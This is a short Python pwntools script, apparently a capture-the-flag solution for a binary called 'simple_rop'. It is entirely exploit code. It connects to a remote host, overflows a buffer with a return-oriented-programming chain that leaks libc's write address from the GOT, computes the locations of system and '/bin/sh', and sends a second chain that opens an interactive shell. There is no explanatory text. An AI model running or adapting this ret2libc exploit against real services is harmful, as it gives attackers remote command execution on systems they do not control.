from pwn import *

p=remote("20.194.60.101", 4147)
#p=process("./simple_rop")
e=ELF("./simple_rop")
l=e.libc

pay="A"*0x18+p64(0x4005E3)+p64(1)+p64(0x4005e1)+p64(e.got['write'])+p64(0)+p64(e.plt['write'])+p64(e.sym['main'])

p.recv()
p.sendline(pay)

libc_base=u64(p.recv(8))-l.sym['write']

log.info(hex(libc_base-l.sym['write']))
log.info(hex(libc_base))

system=libc_base+l.sym['system']
binsh=libc_base+next(l.search("/bin/sh\x00"))

pay="A"*0x18+p64(0x4005E3)+p64(binsh)+p64(system)

p.recv()
p.sendline(pay)

p.interactive()
